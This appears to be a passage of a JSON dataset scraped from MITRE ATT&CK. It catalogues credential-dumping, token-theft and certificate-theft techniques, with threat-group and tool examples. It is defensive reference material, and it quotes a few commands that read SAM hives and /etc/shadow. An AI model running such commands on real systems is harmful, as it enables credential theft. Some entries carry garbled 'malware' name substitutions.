                        "Description": "During <name>, threat actors used ProcDump to dump credentials from memory.[76]"
                    },
                    "G0068": {
                        "ID": "G0068",
                        "Name": "PLATINUM",
                        "Description": "<name> has used keyloggers that are also capable of dumping credentials.[77]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> used voStro.exe, a compiled pypykatz (Python version of Mimikatz), to steal credentials.[78]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> contains an implementation of Mimikatz to gather credentials from memory.[79]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of Exfiltration modules that can harvest credentials using Mimikatz.[80][81]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can execute Lazagne as well as Mimikatz using PowerShell.[82]"
                    },
                    "S0583": {
                        "ID": "S0583",
                        "Name": "Pysa",
                        "Description": "<name> can perform OS credential dumping using Mimikatz.[83]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used its plainpwd tool, a modified version of Mimikatz, and comsvcs.dll to dump Windows credentials from system memory.[84][85][86]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe.[87]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can create a memory dump of LSASS via the MiniDumpWriteDump Win32 API call.[88]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> actors have used a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.[89][90]"
                    },
                    "C0030": {
                        "ID": "C0030",
                        "Name": "Triton Safety Instrumented System Attack",
                        "Description": "In the <name>, TEMP.Veles used Mimikatz.[91]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has attempted to access hashed credentials from the LSASS process memory space.[92]"
                    },
                    "G0107": {
                        "ID": "G0107",
                        "Name": "Whitefly",
                        "Description": "<name> has used Mimikatz to obtain credentials.[93]"
                    },
                    "S0005": {
                        "ID": "S0005",
                        "Name": "Windows Credential Editor",
                        "Description": "<name> can dump credentials.[94]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has dumped the lsass.exe memory to harvest credentials with the use of open-source tool LaZagne.[95]"
                    }
                }
            },
            "002": {
                "name": "Security Account Manager",
                "href": "/techniques/T1003/002",
                "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the net user command. Enumerating the SAM database requires SYSTEM level access.A number of tools can be used to retrieve the SAM file through in-memory techniques:pwdumpx.exegsecdumpMimikatzsecretsdump.pyAlternatively, the SAM can be extracted from the Registry with Reg:reg save HKLM\\sam samreg save HKLM\\system systemCreddump7 can then be used to process the SAM database locally to retrieve hashes.[1]Notes: RID 500 account is the local, built-in administrator.RID 501 is the guest account.User accounts start with a RID of 1,000+.",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used the reg save command to save registry hives.[2]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using the reg save command or by exploiting volume shadow copies.[3]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has copied and exfiltrated the SAM Registry hive from targeted systems.[4]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 copied the SAM and SYSTEM Registry hives for credential harvesting.[5]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can recover hashed passwords.[6]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> collects Windows account hashes.[7]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "Password stealer and NTLM stealer modules in <name> harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication.[8]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can dump usernames and hashed passwords from the SAM.[9]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has dropped and executed SecretsDump to dump password hashes.[10]"
                    },
                    "S0120": {
                        "ID": "S0120",
                        "Name": "Fgdump",
                        "Description": "<name> can dump Windows password hashes.[11]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has extracted the SAM and SYSTEM registry hives using the reg.exe binary for obtaining password hashes from a compromised machine.[12]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used reg commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes.[13]"
                    },
                    "S0008": {
                        "ID": "S0008",
                        "Name": "gsecdump",
                        "Description": "<name> can dump Windows password hashes from the SAM.[14]"
                    },
                    "S0376": {
                        "ID": "S0376",
                        "Name": "HOPLIGHT",
                        "Description": "<name> has the capability to harvest credentials and passwords from the SAM database.[15]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "<name>'s Credential Dumper module can dump encrypted password hashes from SAM registry keys, including HKLM\\SAM\\SAM\\Domains\\Account\\F and HKLM\\SAM\\SAM\\Domains\\Account\\Users\\*\\V.[16]"
                    },
                    "S0357": {
                        "ID": "S0357",
                        "Name": "Impacket",
                        "Description": "SecretsDump and Mimikatz modules within <name> can perform credential dumping to obtain account and password information.[17]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has dumped credentials, including by using gsecdump.[18][19]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can gather hashed passwords by dumping SAM/SECURITY hive.[20]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.[21][22]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name> performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the SAM table.[23][24][25][26]"
                    },
                    "S0080": {
                        "ID": "S0080",
                        "Name": "Mivast",
                        "Description": "<name> has the capability to gather NTLM password information.[27]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors dumped account hashes using gsecdump.[28]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors leveraged a custom tool to dump OS credentials and used following commands: reg save HKLM\\\\SYSTEM system.hiv, reg save HKLM\\\\SAM sam.hiv, and reg save HKLM\\\\SECURITY security.hiv, to dump SAM, SYSTEM and SECURITY hives.[29]"
                    },
                    "S0371": {
                        "ID": "S0371",
                        "Name": "POWERTON",
                        "Description": "<name> has the ability to dump password hashes.[30]"
                    },
                    "S0006": {
                        "ID": "S0006",
                        "Name": "pwdump",
                        "Description": "<name> can be used to dump credentials from the SAM.[31]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> can dump the SAM database.[32]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers.[33][34]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has acquired credentials from the SAM/SECURITY registry hives.[35]"
                    }
                }
            },
            "003": {
                "name": "NTDS",
                "href": "/techniques/T1003/003",
                "description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller.[1]In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.[2]The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.Volume Shadow Copysecretsdump.pyUsing the in-built Windows tool, ntdsutil.exeInvoke-NinjaCopy",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used the ntdsutil.exe utility to export the Active Directory database for credential access.[3]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used ntdsutil to obtain a copy of the victim environment ntds.dit file.[4]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has gathered the SYSTEM registry and ntds.dit files from target systems.[5] <name> specifically has used the NtdsAudit tool to dump the password hashes of domain users via msadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv and used ntdsutil to copy the Active Directory database.[6]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can dump hashed passwords associated with Active Directory using Windows' Directory Replication Services API (DRSUAPI), or Volume Shadow Copy.[7]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors accessed and mounted virtual hard disk backups to extract ntds.dit.[8]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers.[9][10]"
                    },
                    "S0404": {
                        "ID": "S0404",
                        "Name": "esentutl",
                        "Description": "<name> can copy ntds.dit using the Volume Shadow Copy service.[11][12]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has harvested the NTDS.DIT file and leveraged the Impacket tool on the compromised domain controller to locally decrypt it.[13]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used Metasploit\u2019s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.[14][15]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used Volume Shadow Copy to access credential information from NTDS.[16]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has stolen copies of the Active Directory database (NTDS.DIT).[17]"
                    },
                    "S0357": {
                        "ID": "S0357",
                        "Name": "Impacket",
                        "Description": "SecretsDump and Mimikatz modules within <name> can perform credential dumping to obtain account and password information from NTDS.dit.[18]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has used NTDSDump and other password dumping tools to gather credentials.[19]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can gather hashed passwords by gathering domain controller hashes from NTDS.[20]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has used Windows built-in tool ntdsutil to extract the Active Directory (AD) database.[21]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used Ntdsutil to dump credentials.[22]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file. <name> has also used reg save on the SYSTEM file Registry location to help extract the NTDS.dit file.[23]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used ntdsutil.exe to back up the Active Directory database, likely for credential access.[24]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "<name> has extracted the NTDS.dit file by creating volume shadow copies of virtual domain controller disks.[25]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used ntds.util to create domain controller installation media containing usernames and password hashes.[26][27][28]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has gained access to credentials via exported copies of the ntds.dit Active Directory database. <name> has also created a volume shadow copy and used a batch script file to collect NTDS.dit with the use of the Windows utility, ntdsutil.[29][30]"
                    }
                }
            },
            "004": {
                "name": "LSA Secrets",
                "href": "/techniques/T1003/004",
                "description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.[1][2][3] LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets. LSA secrets can also be dumped from memory.[4]Reg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.[4]",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can dump secrets from the Local Security Authority.[5]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used the reg save command to extract LSA secrets offline.[6]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used a variety of publicly available tools like LaZagne to gather credentials.[7][8]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> collects LSA secrets.[9]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can dump hashed passwords from LSA secrets for the targeted system.[10]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has dropped and executed SecretsDump to dump password hashes.[11][12]"
                    },
                    "S0008": {
                        "ID": "S0008",
                        "Name": "gsecdump",
                        "Description": "<name> can dump LSA secrets.[13]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "<name>'s Credential Dumper module can dump LSA secrets from registry keys, including: HKLM\\SECURITY\\Policy\\PolEKList\\default, HKLM\\SECURITY\\Policy\\Secrets\\*\\CurrVal, and HKLM\\SECURITY\\Policy\\Secrets\\*\\OldVal.[14]"
                    },
                    "S0357": {
                        "ID": "S0357",
                        "Name": "Impacket",
                        "Description": "SecretsDump and Mimikatz modules within <name> can perform credential dumping to obtain account and password information.[15]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has dumped credentials, including by using gsecdump.[16][17]"
                    },
                    "S0349": {
                        "ID": "S0349",
                        "Name": "LaZagne",
                        "Description": "<name> can perform credential dumping from LSA secrets to obtain account and password information.[18]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> used several tools for retrieving login and password information, including LaZagne.[19]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.[20][21]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name> performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA.[22][23][24][25]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has performed credential dumping with LaZagne.[26][27]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[28][29][30][31]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can use Lazagne for harvesting credentials.[32]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers.[33][34]"
                    }
                }
            },
            "005": {
                "name": "Cached Domain Credentials",
                "href": "/techniques/T1003/005",
                "description": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.[1]On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.[2] The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password.[3]On Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at /var/lib/sss/db/cache.[domain].ldb for SSSD or /var/opt/quest/vas/authcache/vas_auth.vdb for Quest. Adversaries can use utilities, such as tdbdump, on these database files to dump the cached hashes and use Password Cracking to obtain the plaintext password.[4] With SYSTEM or sudo access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.[4]Note: Cached credentials for Windows Vista are derived using PBKDF2.[2]",
                "Procedure": {
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used a variety of publicly available tools like LaZagne to gather credentials.[5][6]"
                    },
                    "S0119": {
                        "ID": "S0119",
                        "Name": "Cachedump",
                        "Description": "<name> can extract cached password hashes from cache entry information.[7]"
                    },
                    "S0349": {
                        "ID": "S0349",
                        "Name": "LaZagne",
                        "Description": "<name> can perform credential dumping from MSCache to obtain account and password information.[8]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> used several tools for retrieving login and password information, including LaZagne.[9]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has performed credential dumping with LaZagne.[10][11]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[12][13][14][15]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> was seen using modified Quarks PwDump to perform credential dumping.[16]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can use Lazagne for harvesting credentials.[17]"
                    }
                }
            },
            "006": {
                "name": "DCSync",
                "href": "/techniques/T1003/006",
                "description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)[1] [2] [3] [4] to simulate the replication process from a remote domain controller using a technique called DCSync.Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data[5] from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket[6] or change an account's password as noted in Account Manipulation.[7]DCSync functionality has been included in the \"lsadump\" module in Mimikatz.[8] Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.[9]",
                "Procedure": {
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider performed domain replication.[10]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has used a DCSync command with Mimikatz to retrieve credentials from an exploited controller.[11]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has used DCSync attacks to gather credentials for privilege escalation routines.[12]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name> performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DCSync/NetSync.[13][8][14][15][16]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used Mimikatz's DCSync to dump credentials from the memory of the targeted system.[17]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used privileged accounts to replicate directory service data with domain controllers.[18][19][20]"
                    }
                }
            },
            "007": {
                "name": "Proc Filesystem",
                "href": "/techniques/T1003/007",
                "description": "Adversaries may gather credentials from the proc filesystem or /proc. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the /proc/<PID>/maps file shows how memory is mapped within the process\u2019s virtual address space. And /proc/<PID>/mem, exposed for debugging purposes, provides access to the process\u2019s virtual address space.[1][2]When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1, to look for fixed strings in memory structures or cached hashes.[3] When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.[4][5]If running as or with the permissions of a web browser, a process can search the /maps & /mem locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",
                "Procedure": {
                    "S0349": {
                        "ID": "S0349",
                        "Name": "LaZagne",
                        "Description": "<name> can use the <PID>/maps and <PID>/mem files to identify regex patterns to dump cleartext passwords from the browser's process memory.[6][1]"
                    },
                    "S0179": {
                        "ID": "S0179",
                        "Name": "MimiPenguin",
                        "Description": "<name> can use the <PID>/maps and <PID>/mem file to search for regex patterns and dump the process memory.[4][1]"
                    },
                    "S1109": {
                        "ID": "S1109",
                        "Name": "PACEMAKER",
                        "Description": "<name> has the ability to extract credentials from OS memory.[7]"
                    }
                }
            },
            "008": {
                "name": "/etc/passwd and /etc/shadow",
                "href": "/techniques/T1003/008",
                "description": "Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information including password hashes in /etc/shadow. By default, /etc/shadow is only readable by the root user.[1]The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:[2] # /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db",
                "Procedure": {
                    "S0349": {
                        "ID": "S0349",
                        "Name": "LaZagne",
                        "Description": "<name> can obtain credential information from /etc/shadow using the shadow.py module.[3]"
                    }
                }
            }
        },
        "tactic": "Credential Access",
        "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.[1] Credentials can then be used to perform Lateral Movement and access restricted information.Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.[2][3][4]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware used GetPassword_x64 to harvest credentials.[5][6]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used different versions of Mimikatz to obtain credentials.[7]"
            },
            "G0001": {
                "ID": "G0001",
                "Name": "Axiom",
                "Description": "malware has been known to dump credentials.[8]"
            },
            "S0030": {
                "ID": "S0030",
                "Name": "Carbanak",
                "Description": "malware obtains Windows logon password details.[9]"
            },
            "S0232": {
                "ID": "S0232",
                "Name": "HOMEFRY",
                "Description": "malware can perform credential dumping.[10]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has used publicly available tools to dump password hashes, including HOMEFRY.[11]"
            },
            "S0052": {
                "ID": "S0052",
                "Name": "OnionDuke",
                "Description": "malware steals credentials from its victims.[12]"
            },
            "S0048": {
                "ID": "S0048",
                "Name": "PinchDuke",
                "Description": "malware steals credentials from compromised hosts. malware's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by malware include ones associated many sources such as WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).[12]"
            },
            "G0033": {
                "ID": "G0033",
                "Name": "Poseidon Group",
                "Description": "malware conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.[13]"
            },
            "S0379": {
                "ID": "S0379",
                "Name": "Revenge RAT",
                "Description": "malware has a plugin for credential harvesting.[14]"
            },
            "G0054": {
                "ID": "G0054",
                "Name": "Sowbug",
                "Description": "malware has used credential dumping tools.[15]"
            },
            "G0039": {
                "ID": "G0039",
                "Name": "Suckfly",
                "Description": "malware used a signed credential-dumping tool to obtain victim account credentials.[16]"
            },
            "G0131": {
                "ID": "G0131",
                "Name": "Tonto Team",
                "Description": "malware has used a variety of credential dumping tools.[17]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can dump passwords and save them into \\ProgramData\\Mail\\MailAg\\pwds.txt.[18]"
            }
        }
    },
    "T1528": {
        "ttp_name": "Steal Application Access Token",
        "ttp_id": "T1528",
        "href": "/techniques/T1528",
        "tactic": "Credential Access",
        "description": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).[1]  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.For example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.[2]  Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.[3] If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges.Token theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.[4][5] An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.[6][7] The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.[8] Then, they can send a Spearphishing Link to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token.[9]Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens[10], allowing them to obtain new access tokens without prompting the user.",
        "Procedure": {
            "S0677": {
                "ID": "S0677",
                "Name": "AADInternals",
                "Description": "malware can steal users\u2019 access tokens via phishing emails containing malicious links.[11]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has used several malicious applications to steal user OAuth access tokens including applications masquerading as \"Google Defender\" \"Google Email Protection,\" and \"Google Scanner\" for Gmail users. They also targeted Yahoo users with applications masquerading as \"Delivery Service\" and \"McAfee Email Protection\".[7]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware uses stolen tokens to access victim accounts, without needing a password.[12]"
            },
            "S0683": {
                "ID": "S0683",
                "Name": "Peirates",
                "Description": "malware gathers Kubernetes service account tokens using a variety of techniques.[13]"
            }
        }
    },
    "T1649": {
        "ttp_name": "Steal or Forge Authentication Certificates",
        "ttp_id": "T1649",
        "href": "/techniques/T1649",
        "tactic": "Credential Access",
        "description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.[1][2]Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)[3], misplaced certificate files (i.e. Unsecured Credentials), or directly from the Windows certificate store via various crypto APIs.[4][5][6] With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate\u2019s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate\u2019s subject alternative name (SAN) values define the certificate owner\u2019s alternate names.[7]Abusing certificates for authentication credentials may enable other behaviors such as Lateral Movement. Certificate-related misconfigurations may also enable opportunities for Privilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable Persistence via stealing or forging certificates that can be used as Valid Accounts for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish Persistence by forging arbitrary authentication certificates for the victim domain (known as \"golden\" certificates).[7] Adversaries may also target certificates and related services in order to access other forms of credentials, such as Golden Ticket ticket-granting tickets (TGT) or NTLM plaintext.[7]",
        "Procedure": {
            "S0677": {
                "ID": "S0677",
                "Name": "AADInternals",
                "Description": "malware can create and export various authentication certificates, including those associated with Azure AD joined/registered devices.[8]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates.[9]"
            },
            "S0002": {
                "ID": "S0002",
                "Name": "Mimikatz",
                "Description": "malware's CRYPTO module can create and export various types of authentication certificates.[10]"
            }
        }
    },
    "T1558": {
        "ttp_name": "Steal or Forge Kerberos Tickets",
        "ttp_id": "T1558",
        "href": "/techniques/T1558",
        "subtechnique": {
            "001": {
                "name": "Golden Ticket",
                "href": "/techniques/T1558/001",
